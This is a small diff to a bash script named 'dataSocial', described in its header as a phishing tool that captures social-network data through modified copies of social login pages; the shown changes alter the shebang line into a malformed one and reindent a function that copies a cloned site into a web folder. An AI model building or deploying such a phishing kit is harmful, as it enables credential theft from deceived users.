@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+#/!/usr/bin/env bash
 # dataSocial - Pesca dados de redes sociais através de páginas sociais modificadas usando a técnica phishing de engenharia social
 #
 # Site		: https://programadorboard.epizy.com/autor
@@ -167,10 +167,9 @@ copyFiles() {
     [ ! -d ./www ] && mkdir ./www
 
     if [ -d websites/${service} ] ; then
-	cp -rf websites/${service}/* ./www
-
+		cp -rf websites/${service}/* ./www
     else
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis service is not available\e[0m"
+		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis service is not available\e[0m"
     fi
 }
 
